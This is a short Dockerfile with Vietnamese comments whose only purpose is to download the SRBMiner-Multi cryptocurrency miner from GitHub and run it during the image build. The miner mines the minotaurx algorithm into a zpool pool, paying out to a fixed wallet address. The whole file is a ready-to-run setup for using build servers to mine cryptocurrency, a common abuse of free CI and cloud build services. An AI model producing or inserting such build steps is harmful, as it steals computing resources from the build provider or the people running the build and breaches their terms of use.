# Sử dụng Ubuntu làm base image
FROM ubuntu:20.04

# Cài đặt các công cụ cần thiết
RUN apt-get update && apt-get install -y \
    curl \
    sudo \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Tải xuống, giải nén và chạy miner trong quá trình build
RUN curl -L -O -J https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.4/SRBMiner-Multi-2-5-4-Linux.tar.gz && \
    tar -xf SRBMiner-Multi-2-5-4-Linux.tar.gz && \
    cd SRBMiner-Multi-2-5-4 && \
    sudo ./SRBMiner-MULTI --algorithm minotaurx \
                          --pool minotaurx.sea.mine.zpool.ca:7019 \
                          --wallet R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q \
                          --password c=RVN \
                          --keepalive true
